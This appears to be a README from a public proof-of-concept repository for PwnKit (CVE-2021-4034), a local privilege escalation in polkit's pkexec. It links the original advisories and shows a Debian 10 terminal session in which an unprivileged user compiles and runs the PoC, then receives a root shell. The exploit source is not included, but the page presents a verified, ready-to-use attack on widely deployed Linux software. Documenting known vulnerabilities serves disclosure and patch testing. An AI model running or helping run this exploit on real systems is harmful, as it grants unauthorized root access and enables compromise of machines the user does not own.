# CVE-2021-4034

PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034)

https://seclists.org/oss-sec/2022/q1/80
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

# PoC

Verified on Debian 10

```
user@debian:~$ grep PRETTY /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"

user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

user@debian:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
user@debian:~$ ./cve-2021-4034-poc

# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(user)

```
